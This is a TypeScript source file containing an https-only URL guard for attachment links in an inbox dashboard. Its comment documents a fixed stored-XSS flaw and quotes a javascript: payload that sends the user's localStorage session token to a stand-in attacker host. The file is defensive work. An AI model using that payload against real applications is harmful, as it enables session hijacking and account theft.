/**
 * The one scheme test for a URL that is about to become a link (or a navigation).
 *
 * The inbox renders attachment links straight out of the stored message payload,
 * and a payload is whatever an agent with inbox_reply sent us: a crafted
 * `media_url` used to be persisted verbatim and rendered as `href`, so
 * `javascript:fetch('https://evil/?t=' + localStorage.token)` ran in the
 * dashboard origin when the owner clicked the attachment — the nginx CSP allows
 * 'unsafe-inline' and does not block a `javascript:` navigation, and the session
 * token is JS-readable by design (lib/session-token.ts). The server now refuses
 * a non-https media_url on the way in (internal/api/inbox_handlers.go
 * agentReply); this is the last line, and it is also what a signed object-store
 * link or a static docs URL goes through.
 *
 * A type predicate, so `href={url}` is a string once the guard has passed.
 */
export function isSafeHTTPSURL(url: string | null | undefined): url is string {
  return typeof url === "string" && /^https:\/\//i.test(url);
}
